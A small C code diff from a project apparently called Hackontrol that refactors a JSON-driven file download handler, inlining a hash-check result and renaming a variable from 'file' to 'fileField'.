@@ -13,9 +13,7 @@ static void download(const cJSON* const root, const LPCWSTR folderHackontrol) {
 		return;
 	}
 
-	BOOL match = ExecuteHashFileCheck(root, file);
-
-	if(match) {
+	if(ExecuteHashFileCheck(root, file)) {
 		goto freeFile;
 	}
 
@@ -44,18 +42,18 @@ freeFile:
 }
 
 void ExecuteDownload(const cJSON* const root, const LPCWSTR folderHackontrol) {
-	cJSON* file = cJSON_GetObjectItem(root, "file");
+	cJSON* fileField = cJSON_GetObjectItem(root, "file");
 
-	if(!file) {
+	if(!fileField) {
 		return;
 	}
 
-	if(!cJSON_IsArray(file)) {
-		download(file, folderHackontrol);
+	if(!cJSON_IsArray(fileField)) {
+		download(fileField, folderHackontrol);
 		return;
 	}
 
-	for(int i = 0; i < cJSON_GetArraySize(file); i++) {
-		download(cJSON_GetArrayItem(file, i), folderHackontrol);
+	for(int i = 0; i < cJSON_GetArraySize(fileField); i++) {
+		download(cJSON_GetArrayItem(fileField, i), folderHackontrol);
 	}
 }
